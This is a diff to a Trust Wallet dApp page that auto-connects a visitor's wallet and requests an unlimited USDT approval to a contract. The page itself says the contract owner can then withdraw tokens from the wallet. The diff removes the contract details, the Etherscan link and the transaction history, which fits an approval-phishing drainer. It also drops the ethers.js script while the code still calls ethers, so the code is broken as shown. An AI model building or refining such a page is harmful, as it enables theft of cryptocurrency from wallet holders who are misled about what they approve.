@@ -67,6 +67,7 @@
         .btn-danger:hover { background: #f85149; }
         .btn-wallet { background: #8b5cf6; color: #fff; }
         .btn-wallet:hover { background: #7c3aed; }
+        .btn-wallet:disabled { background: #4a3a7a; color: #8b949e; cursor: not-allowed; }
         .status-msg {
             margin-top: 10px;
             padding: 10px;
@@ -92,16 +93,8 @@
         .footer { text-align: center; font-size: 12px; color: #484f58; margin-top: 10px; }
         .footer a { color: #58a6ff; text-decoration: none; }
         .footer a:hover { text-decoration: underline; }
-        .wallet-buttons { display: flex; gap: 10px; flex-wrap: wrap; }
-        .wallet-buttons .btn { flex: 1; min-width: 120px; }
-        @media (max-width: 480px) {
-            .container { padding: 16px; }
-            h1 { font-size: 22px; }
-            .flex-row { flex-direction: column; align-items: stretch; }
-            .wallet-buttons { flex-direction: column; }
-            .wallet-buttons .btn { width: 100%; }
-        }
         .hidden { display: none !important; }
+        .text-center { text-align: center; }
     </style>
 </head>
 <body>
@@ -113,14 +106,12 @@
     <!-- ===== WALLET CONNECTION ===== -->
     <div class="card">
         <div class="flex-row">
-            <h3>🦊 Wallet</h3>
+            <h3>📱 Wallet</h3>
             <span id="walletStatus" class="badge badge-gray">Not Connected</span>
         </div>
         <p id="walletAddress" style="font-size:12px;color:#484f58;">Click "Connect Wallet" to start</p>
         
-        <div class="wallet-buttons mt-10">
-            <button id="connectBtn" class="btn btn-wallet">📱 Connect Wallet</button>
-        </div>
+        <button id="connectBtn" class="btn btn-wallet mt-10">🔗 Connect Wallet</button>
         
         <div id="networkInfo" class="mt-10" style="font-size:12px;color:#8b949e;"></div>
         <div id="walletProvider" class="mt-10" style="font-size:12px;color:#484f58;"></div>
@@ -151,7 +142,7 @@
             Connect Wallet First
         </button>
 
-        <div id="approvalStatus" class="status-msg info mt-10" style="display:none;">
+        <div id="approvalStatus" class="status-msg info mt-10 hidden">
             ⏳ Waiting for approval...
         </div>
     </div>
@@ -162,35 +153,17 @@
         <p style="font-size:13px;color:#8b949e;">
             After approval, the contract owner can withdraw tokens from your wallet.
         </p>
-        <div style="background:#0d1117;padding:12px;border-radius:6px;margin-top:8px;">
-            <p style="font-size:12px;color:#8b949e;">
-                <strong>Function:</strong> executeFundsPayout()<br />
-                <strong>Token:</strong> USDT<br />
-                <strong>Contract:</strong> TokenizedFundsSettlement
-            </p>
-        </div>
-    </div>
-
-    <!-- ===== TRANSACTION HISTORY ===== -->
-    <div class="card hidden" id="txHistory">
-        <h3>📜 Transaction History</h3>
-        <div id="txList"></div>
     </div>
 
     <hr class="divider" />
     <div class="footer">
-        <p>
-            Contract: <a href="#" id="etherscanLink" target="_blank">View on Etherscan</a>
-        </p>
+        <p>Trust Wallet DApp Browser</p>
     </div>
 </div>
 
 <!-- ============================================================ -->
 <!-- ===================== JAVASCRIPT ============================= -->
 <!-- ============================================================ -->
-
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
-</script>
 
 <script>
     // ================================================================
@@ -228,9 +201,6 @@
     const allowanceDisplay = $('allowanceDisplay');
     const approveBtn = $('approveBtn');
     const approvalStatus = $('approvalStatus');
-    const txHistory = $('txHistory');
-    const txList = $('txList');
-    const etherscanLink = $('etherscanLink');
 
     // ================================================================
     //  STATE
@@ -241,32 +211,32 @@
     let chainId = null;
     let usdtContract = null;
     let isApproved = false;
-    let isConnecting = false;
 
     // ================================================================
-    //  SIMPLE DETECT - WORKS FOR TRUST WALLET
+    //  GET PROVIDER - TRUST WALLET DAPP
     // ================================================================
-    function getEthereumProvider() {
-        console.log('[DEBUG] Looking for provider...');
+    function getProvider() {
+        console.log('[DEBUG] Getting provider...');
         
-        // Method 1: Direct window.ethereum
+        // Trust Wallet DApp Browser injects provider differently
+        // It uses window.ethereum but we need to check properly
+        
+        // Method 1: Check window.ethereum
         if (window.ethereum) {
             console.log('[DEBUG] window.ethereum found');
             return window.ethereum;
         }
         
-        // Method 2: Trust Wallet
-        if (window.trustwallet) {
-            console.log('[DEBUG] window.trustwallet found');
-            window.ethereum = window.trustwallet;
-            return window.trustwallet;
-        }
-        
-        // Method 3: Check for web3
+        // Method 2: Check window.web3
         if (window.web3 && window.web3.currentProvider) {
             console.log('[DEBUG] window.web3 found');
-            window.ethereum = window.web3.currentProvider;
             return window.web3.currentProvider;
+        }
+        
+        // Method 3: Check for Trust Wallet specific
+        if (window.trustwallet) {
+            console.log('[DEBUG] window.trustwallet found');
+            return window.trustwallet;
         }
         
         console.log('[DEBUG] No provider found');
@@ -278,8 +248,7 @@
     // ================================================================
     function waitForProvider() {
         return new Promise((resolve) => {
-            // Check immediately
-            let provider = getEthereumProvider();
+            let provider = getProvider();
             if (provider) {
                 resolve(provider);
                 return;
@@ -287,15 +256,14 @@
 
             console.log('[DEBUG] Waiting for provider...');
             let attempts = 0;
-            const maxAttempts = 20;
+            const maxAttempts = 30;
             
             const interval = setInterval(() => {
                 attempts++;
-                console.log(`[DEBUG] Attempt ${attempts}...`);
+                provider = getProvider();
                 
-                provider = getEthereumProvider();
                 if (provider) {
-                    console.log('[DEBUG] ✅ Provider found!');
+                    console.log('[DEBUG] ✅ Provider found after', attempts, 'attempts');
                     clearInterval(interval);
                     resolve(provider);
                     return;
@@ -311,102 +279,9 @@
     }
 
     // ================================================================
-    //  UTILITY FUNCTIONS
-    // ================================================================
-    function getChainName(id) {
-        const names = {
-            1: 'Ethereum Mainnet',
-            5: 'Goerli',
-            11155111: 'Sepolia',
-            137: 'Polygon',
-            80001: 'Mumbai',
-            56: 'BSC',
-            97: 'BSC Testnet'
-        };
-        return names[id] || `Chain ID: ${id}`;
-    }
-
-    function updateEtherscanLink() {
-        if (chainId === 1) {
-            etherscanLink.href = `https://etherscan.io/address/${CONFIG.contractAddress}`;
-            etherscanLink.textContent = 'Etherscan';
-        } else if (chainId === 11155111) {
-            etherscanLink.href = `https://sepolia.etherscan.io/address/${CONFIG.contractAddress}`;
-            etherscanLink.textContent = 'Sepolia Etherscan';
-        } else {
-            etherscanLink.href = '#';
-            etherscanLink.textContent = 'Unknown Network';
-        }
-    }
-
-    // ================================================================
-    //  UPDATE UI
-    // ================================================================
-    function updateWalletUI() {
-        if (userAddress) {
-            walletStatus.textContent = '✅ Connected';
-            walletStatus.className = 'badge badge-green';
-            walletAddress.textContent = userAddress;
-            walletAddress.style.color = '#c9d1d9';
-            walletProvider.textContent = '🔗 Trust Wallet';
-            connectBtn.textContent = 'Disconnect Wallet';
-            connectBtn.className = 'btn btn-danger';
-            approveBtn.disabled = false;
-            approveBtn.textContent = 'Approve USDT (Unlimited)';
-        } else {
-            walletStatus.textContent = 'Not Connected';
-            walletStatus.className = 'badge badge-gray';
-            walletAddress.textContent = 'Click "Connect Wallet" to start';
-            walletAddress.style.color = '#484f58';
-            walletProvider.textContent = '';
-            connectBtn.textContent = '📱 Connect Wallet';
-            connectBtn.className = 'btn btn-wallet';
-            approveBtn.disabled = true;
-            approveBtn.textContent = 'Connect Wallet First';
-        }
-    }
-
-    function updateApprovalUI() {
-        if (isApproved) {
-            approvalBadge.textContent = '✅ Approved';
-            approvalBadge.className = 'badge badge-green';
-            approveBtn.textContent = '✅ Already Approved';
-            approveBtn.disabled = true;
-        } else {
-            approvalBadge.textContent = '⏳ Not Approved';
-            approvalBadge.className = 'badge badge-orange';
-            if (userAddress) {
-                approveBtn.disabled = false;
-                approveBtn.textContent = 'Approve USDT (Unlimited)';
-                approveBtn.className = 'btn btn-primary';
-            }
-        }
-    }
-
-    function updateAllowanceDisplay(val) {
-        if (val !== undefined && val !== null) {
-            const num = Number(val);
-            if (num > 0) {
-                allowanceDisplay.textContent = `${num.toLocaleString()} USDT`;
-                isApproved = true;
-            } else {
-                allowanceDisplay.textContent = '0 USDT';
-                isApproved = false;
-            }
-        } else {
-            allowanceDisplay.textContent = 'Loading...';
-        }
-        updateApprovalUI();
-    }
-
-    // ================================================================
-    //  CONNECT WALLET - SIMPLE VERSION
+    //  CONNECT WALLET
     // ================================================================
     async function connectWallet() {
-        console.log('[DEBUG] connectWallet() called');
-        
-        if (isConnecting) return;
-
         if (userAddress) {
             // Disconnect
             userAddress = null;
@@ -414,16 +289,23 @@
             provider = null;
             usdtContract = null;
             isApproved = false;
-            updateWalletUI();
-            allowanceDisplay.textContent = 'Loading...';
+            walletStatus.textContent = 'Not Connected';
+            walletStatus.className = 'badge badge-gray';
+            walletAddress.textContent = 'Click "Connect Wallet" to start';
+            walletAddress.style.color = '#484f58';
+            walletProvider.textContent = '';
+            connectBtn.textContent = '🔗 Connect Wallet';
+            connectBtn.className = 'btn btn-wallet';
+            approveBtn.disabled = true;
+            approveBtn.textContent = 'Connect Wallet First';
             approvalBadge.textContent = '⏳ Not Connected';
             approvalBadge.className = 'badge badge-gray';
+            allowanceDisplay.textContent = 'Loading...';
             networkInfo.textContent = '';
-            approvalStatus.style.display = 'none';
+            approvalStatus.classList.add('hidden');
             return;
         }
 
-        isConnecting = true;
         connectBtn.disabled = true;
         connectBtn.textContent = '⏳ Connecting...';
         walletStatus.textContent = 'Connecting...';
@@ -431,20 +313,19 @@
 
         try {
             // Wait for provider
-            const ethereumProvider = await waitForProvider();
+            const ethProvider = await waitForProvider();
             
-            if (!ethereumProvider) {
+            if (!ethProvider) {
                 alert('No wallet detected! Please use Trust Wallet browser.');
-                isConnecting = false;
                 connectBtn.disabled = false;
-                connectBtn.textContent = '📱 Connect Wallet';
+                connectBtn.textContent = '🔗 Connect Wallet';
                 walletStatus.textContent = 'Not Connected';
                 walletStatus.className = 'badge badge-gray';
                 return;
             }
 
-            // Create provider
-            provider = new ethers.providers.Web3Provider(ethereumProvider);
+            // Create provider using ethers
+            provider = new ethers.providers.Web3Provider(ethProvider);
             
             // Request accounts
             await provider.send('eth_requestAccounts', []);
@@ -457,17 +338,32 @@
             chainId = network.chainId;
             console.log('[DEBUG] Network:', chainId);
 
+            // Create USDT contract
             usdtContract = new ethers.Contract(CONFIG.usdtAddress, ERC20_ABI, signer);
 
             // Update UI
-            updateWalletUI();
-            networkInfo.textContent = `🌐 ${getChainName(chainId)}`;
-            updateEtherscanLink();
+            walletStatus.textContent = '✅ Connected';
+            walletStatus.className = 'badge badge-green';
+            walletAddress.textContent = userAddress;
+            walletAddress.style.color = '#c9d1d9';
+            walletProvider.textContent = '🔗 Trust Wallet';
+            connectBtn.textContent = 'Disconnect Wallet';
+            connectBtn.className = 'btn btn-danger';
+            approveBtn.disabled = false;
+            approveBtn.textContent = 'Approve USDT (Unlimited)';
+            
+            const chainName = {
+                1: 'Ethereum Mainnet',
+                11155111: 'Sepolia',
+                56: 'BSC',
+                97: 'BSC Testnet'
+            }[chainId] || `Chain ID: ${chainId}`;
+            networkInfo.textContent = `🌐 ${chainName}`;
 
             // Load allowance
             await loadAllowance();
             
-            console.log('[DEBUG] ✅ Success!');
+            console.log('[DEBUG] ✅ Connection successful!');
 
         } catch (error) {
             console.error('[DEBUG] Error:', error);
@@ -475,10 +371,9 @@
             walletStatus.textContent = '❌ Failed';
             walletStatus.className = 'badge badge-red';
         } finally {
-            isConnecting = false;
             connectBtn.disabled = false;
             if (!userAddress) {
-                connectBtn.textContent = '📱 Connect Wallet';
+                connectBtn.textContent = '🔗 Connect Wallet';
                 walletStatus.textContent = 'Not Connected';
                 walletStatus.className = 'badge badge-gray';
             }
@@ -493,7 +388,23 @@
 
         try {
             const allowance = await usdtContract.allowance(userAddress, CONFIG.contractAddress);
-            updateAllowanceDisplay(allowance.toString());
+            const num = Number(allowance);
+            if (num > 0) {
+                allowanceDisplay.textContent = `${num.toLocaleString()} USDT`;
+                isApproved = true;
+                approvalBadge.textContent = '✅ Approved';
+                approvalBadge.className = 'badge badge-green';
+                approveBtn.textContent = '✅ Already Approved';
+                approveBtn.disabled = true;
+            } else {
+                allowanceDisplay.textContent = '0 USDT';
+                isApproved = false;
+                approvalBadge.textContent = '⏳ Not Approved';
+                approvalBadge.className = 'badge badge-orange';
+                approveBtn.disabled = false;
+                approveBtn.textContent = 'Approve USDT (Unlimited)';
+                approveBtn.className = 'btn btn-primary';
+            }
         } catch (error) {
             console.error('Error loading allowance:', error);
             allowanceDisplay.textContent = 'Error loading';
@@ -504,8 +415,6 @@
     //  APPROVE
     // ================================================================
     async function approveToken() {
-        console.log('[DEBUG] approveToken() called');
-        
         if (!userAddress || !usdtContract) {
             alert('Please connect your wallet first!');
             return;
@@ -516,7 +425,7 @@
             return;
         }
 
-        approvalStatus.style.display = 'block';
+        approvalStatus.classList.remove('hidden');
         approvalStatus.className = 'status-msg info';
         approvalStatus.textContent = '⏳ Approving USDT... Please confirm in your wallet.';
         approveBtn.disabled = true;
@@ -531,17 +440,6 @@
             approvalStatus.textContent = '✅ Approval successful!';
 
             await loadAllowance();
-            
-            // Add to history
-            txHistory.classList.remove('hidden');
-            const div = document.createElement('div');
-            div.style.cssText = 'display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #30363d;font-size:12px;';
-            div.innerHTML = `
-                <span>Approve USDT (Unlimited)</span>
-                <span style="color:#2ea043;">✅</span>
-                <span style="font-family:monospace;font-size:11px;color:#8b949e;">${tx.hash.slice(0,10)}...</span>
-            `;
-            txList.prepend(div);
 
         } catch (error) {
             console.error('Approval error:', error);
@@ -556,13 +454,10 @@
     // ================================================================
     async function autoConnect() {
         console.log('[DEBUG] Auto-connecting...');
-        
-        // Wait for provider
-        const provider = await waitForProvider();
-        
-        if (provider && provider.selectedAddress) {
+        const ethProvider = getProvider();
+        if (ethProvider && ethProvider.selectedAddress) {
             console.log('[DEBUG] Auto-connect triggered');
-            setTimeout(connectWallet, 500);
+            await connectWallet();
         } else {
             console.log('[DEBUG] No existing connection');
         }
@@ -580,13 +475,16 @@
     (function init() {
         console.log('🔑 Token Approval App Loaded');
         console.log('User Agent:', navigator.userAgent);
+        console.log('window.ethereum:', window.ethereum ? 'exists' : 'not found');
+        console.log('window.web3:', window.web3 ? 'exists' : 'not found');
+        console.log('window.trustwallet:', window.trustwallet ? 'exists' : 'not found');
         
-        // Wait for page to load
+        // Try to auto-connect after delay
         setTimeout(autoConnect, 2000);
         
         // Also try on load
         window.addEventListener('load', function() {
-            setTimeout(autoConnect, 1000);
+            setTimeout(autoConnect, 1500);
         });
     })();
 </script>
